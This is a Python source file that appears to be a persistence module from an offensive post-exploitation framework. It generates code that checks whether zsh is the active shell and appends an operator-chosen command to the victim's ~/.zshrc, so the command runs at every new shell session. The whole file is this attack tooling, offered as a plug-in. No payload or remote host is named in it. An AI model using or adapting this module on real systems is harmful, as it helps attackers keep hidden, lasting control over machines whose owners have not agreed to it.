from payloads.modules.python.persist.common import rcfile_append


class Module:

    def __init__(self, params=[]):

        self.info = {
            'Author': 'Alain Homewood',
            'Description': 'Checks if zsh is the current shell and appends a command to .zshrc',
        }

        self.options = {
            'Command': {
                'Description': 'The command to append to .zshrc',
                'Required': True,
                'Value': ''
            },
        }

        for param in params:
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value

    def generate(self):
        code = rcfile_append("zsh", "~/.zshrc", self.options['Command']['Value'])
        return code
